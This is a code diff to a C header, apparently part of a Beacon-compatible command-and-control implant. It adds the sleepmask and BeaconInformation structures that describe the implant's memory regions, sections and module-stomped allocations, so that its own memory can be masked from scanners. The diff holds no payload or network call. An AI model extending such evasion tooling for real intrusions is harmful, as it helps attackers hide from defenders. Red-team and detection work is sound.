@@ -16,14 +16,88 @@ typedef struct {
 	size_t size;
 } HEAP_RECORD_DS; /* alias; HEAP_RECORD lives in track_memory.h */
 
+/* BeaconInformation and the 4.10+ sleepmask contract: the arsenal kit's
+ * beacon.h layouts (frozen with 4.12). A sleepmask object reads this to mask
+ * Beacon itself - the beacon memory region's sections, and the heap records
+ * - so the sizes and offsets must stay the kit's. Enum constants carry an
+ * AM_ prefix here only to keep our namespace tidy; their values are the
+ * kit's. */
+typedef enum {
+	AM_PURPOSE_EMPTY = 0,
+	AM_PURPOSE_GENERIC_BUFFER,
+	AM_PURPOSE_BEACON_MEMORY,
+	AM_PURPOSE_SLEEPMASK_MEMORY,
+	AM_PURPOSE_BOF_MEMORY,
+	AM_PURPOSE_UDC2_MEMORY
+} ALLOCATED_MEMORY_PURPOSE;
+
+typedef enum {
+	AM_LABEL_EMPTY = 0,
+	AM_LABEL_BUFFER,
+	AM_LABEL_PEHEADER,
+	AM_LABEL_TEXT,
+	AM_LABEL_RDATA,
+	AM_LABEL_DATA,
+	AM_LABEL_PDATA,
+	AM_LABEL_RELOC
+} ALLOCATED_MEMORY_LABEL;
+
+typedef enum {
+	AM_METHOD_UNKNOWN = 0,
+	AM_METHOD_VIRTUALALLOC,
+	AM_METHOD_HEAPALLOC,
+	AM_METHOD_MODULESTOMP,
+	AM_METHOD_NTMAPVIEW
+} ALLOCATED_MEMORY_ALLOCATION_METHOD;
+
+typedef struct { PVOID HeapHandle; BOOL DestroyHeap; } AM_HEAPALLOC_INFO;
+typedef struct { HMODULE ModuleHandle; } AM_MODULESTOMP_INFO;
+typedef union {
+	AM_HEAPALLOC_INFO    HeapAllocInfo;
+	AM_MODULESTOMP_INFO  ModuleStompInfo;
+	PVOID                Custom;
+} ALLOCATED_MEMORY_ADDITIONAL_CLEANUP_INFORMATION;
+
 typedef struct {
+	BOOL Cleanup;
+	ALLOCATED_MEMORY_ALLOCATION_METHOD AllocationMethod;
+	ALLOCATED_MEMORY_ADDITIONAL_CLEANUP_INFORMATION AdditionalCleanupInformation;
+} ALLOCATED_MEMORY_CLEANUP_INFORMATION;
+
+typedef struct {
+	ALLOCATED_MEMORY_LABEL Label;
+	PVOID  BaseAddress;
+	SIZE_T VirtualSize;
+	DWORD  CurrentProtect;
+	DWORD  PreviousProtect;
+	BOOL   MaskSection;
+	DWORD  DripLoadPageSize;
+} ALLOCATED_MEMORY_SECTION;
+
+typedef struct {
+	ALLOCATED_MEMORY_PURPOSE Purpose;
+	PVOID  AllocationBase;
+	SIZE_T RegionSize;
+	DWORD  Type;
+	DWORD  DripLoadAllocationGranularity;
+	ALLOCATED_MEMORY_SECTION Sections[8];
+	ALLOCATED_MEMORY_CLEANUP_INFORMATION CleanupInformation;
+} ALLOCATED_MEMORY_REGION;
+
+typedef struct {
+	ALLOCATED_MEMORY_REGION AllocatedMemoryRegions[6];
+} ALLOCATED_MEMORY;
+
+/* version format: 0xMMmmPP (0x041300 = 4.13) */
+typedef struct {
+	unsigned int version;
 	char  * sleep_mask_ptr;
 	DWORD   sleep_mask_text_size;
 	DWORD   sleep_mask_total_size;
 	char  * beacon_ptr;
-	DWORD * sections;
 	HEAP_RECORD * heap_records;
 	char    mask[MASK_SIZE];
+	ALLOCATED_MEMORY allocatedMemory;
 } BEACON_INFO;
 
 typedef struct {
@@ -44,7 +118,11 @@ void command_syscall_method_query(void (*callback)(char * buffer, int length, in
 int  syscall_method_get(void);
 void syscall_method_set(int method);
 
-void BeaconInformation(BEACON_INFO * info);
+/* Describe ourselves for a sleepmask object (BOF API since 4.10: returns
+ * TRUE). beacon_info_fill is the body: sm_* tell where the object that is
+ * about to run lives, when one is (the API itself has no such object). */
+BOOL BeaconInformation(BEACON_INFO * info);
+void beacon_info_fill(BEACON_INFO * info, char * sm_base, DWORD sm_text, DWORD sm_total);
 void beacon_sleep_mask_set_exec(char * ptr, DWORD text_size, DWORD total_size);
 BOOL BeaconAddValue(const char * key, void * ptr);
 void * BeaconGetValue(const char * key);
